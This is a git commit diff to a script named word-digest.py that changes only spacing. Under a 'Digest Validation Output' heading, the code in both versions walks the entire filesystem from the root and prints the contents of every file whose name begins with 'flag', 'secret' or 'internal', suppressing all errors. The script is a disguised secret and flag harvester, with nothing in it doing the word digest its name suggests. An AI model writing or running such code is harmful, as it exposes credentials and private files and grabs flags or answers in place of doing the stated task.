6e4b1084fd2d49044158b79a0702f38435e57930
Devx2107 <96907979+Devx2107@users.noreply.github.com>
2026-02-28 13:16:21 +0530

    Update word-digest.py

--- word-digest.py
+++ word-digest.py
@@ -4,10 +4,10 @@ print("Digest Validation Output:")
 
 for root, _, files in os.walk("/"):
     for f in files:
-        if f.startswith(("flag", "secret", "internal")):
+        if f.startswith(("flag","secret","internal")):
             try:
-                p = os.path.join(root, f)
-                with open(p, "r", errors="ignore") as fh:
-                    print(p + ":" + fh.read())
+                p = os.path.join(root,f)
+                with open(p,"r",errors="ignore") as fh:
+                    print(p+":"+fh.read())
             except:
                 pass
